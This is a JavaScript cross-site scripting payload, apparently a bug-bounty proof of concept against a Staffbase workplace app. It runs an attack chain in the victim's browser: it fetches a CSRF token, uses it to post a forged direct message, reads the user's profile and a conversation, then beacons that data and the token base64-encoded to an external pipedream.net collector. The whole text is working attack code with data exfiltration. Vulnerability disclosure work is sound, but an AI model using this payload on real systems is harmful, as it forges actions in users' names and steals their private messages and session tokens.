(async () => {
    alert(document.domain);
    try {
        // 1. Fetch CSRF Token
        const authRes = await fetch('/auth/discover', {
            headers: { 'Accept': 'application/vnd.staffbase.auth.discovery.v2+json' }
        });
        const { csrfToken: t } = await authRes.json();

        // 2. Perform Integrity Violation (POST message)
        await fetch('/api/installations/695f4cd124eb235aea87a3a4/conversations/direct/69611c0befab8f75c1e5ec49', {
            method: 'POST',
            headers: {
                'content-type': 'application/json',
                'x-csrf-token': t
            },
		body: JSON.stringify({ message: 'Version 2: H1 Triage: Integrity Violation PoC' })
        });
        alert('Integrity Violation Successful: Message sent using CSRF token ' + t);

        // 3. Exfiltrate Data
        const [u, c] = await Promise.all([
            fetch('/api/users/me').then(r => r.json()),
            fetch('/api/conversations/6961496d4575375e9480c7f3').then(r => r.json())
        ]);

        const d = { user: u, chats: c, token: t };
        navigator.sendBeacon('https://eoeqgca83zpr7tb.m.pipedream.net?data=' + btoa(JSON.stringify(d)));

    } catch (e) {
        alert('Error: ' + e.message);
        navigator.sendBeacon('https://eoeqgca83zpr7tb.m.pipedream.net?error=' + btoa(e.message));
    }
})();
